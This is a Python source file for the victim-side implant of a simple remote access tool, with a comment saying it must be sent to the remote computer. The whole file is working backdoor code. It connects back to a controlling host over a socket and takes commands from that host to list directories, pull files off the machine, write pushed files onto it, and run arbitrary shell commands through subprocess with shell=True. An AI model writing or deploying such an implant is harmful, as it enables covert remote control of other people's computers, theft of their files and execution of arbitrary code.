# This must be sent to the remote computer
import os
import time
import socket
import pickle
import subprocess

s = socket.socket()
host = socket.gethostname() #for localhost as victim
port = 8080

##### Establishing a Connection #####

print("")
print("[*] Establishing connection to ", host)

s.connect((host, port))

print("[*] Connection established successfully")

##### Connection Has Been Completed #####

##### Command Handling #####

while 1:
    command = s.recv(1024)
    command = command.decode()
    output = ""

    # Print Current Working Directory
    if command == "cwd":
        cmd = os.getcwd()
        cmd = str(cmd)
        s.send(cmd.encode())

    elif command == "list":
        output = os.listdir(os.getcwd())
        output = pickle.dumps(output)
        s.send(output)

    elif command == "exit":
        exit()

    elif command == "custom_dir":
        name = s.recv(5000)
        name = name.decode()
        
        output = os.listdir(name)
        output = pickle.dumps(output)  #for encoding list
        s.send(output)

    elif command == "pull":
        path = s.recv(5000)
        path = path.decode()

        file = s.recv(10000)
        file = open(path, "rb")
        data = file.read()
        s.send(data)

    elif command == "push":
        path = s.recv(5000)
        data = s.recv(100000)
        
        file = open(path, "wb")
        file.write(data)
        file.close()

    elif command == "exec":
        command = s.recv(5000)
        command = command.decode()
        subprocess.call(command, shell=True)
            
    else:
        print("Unknown command: ",command)



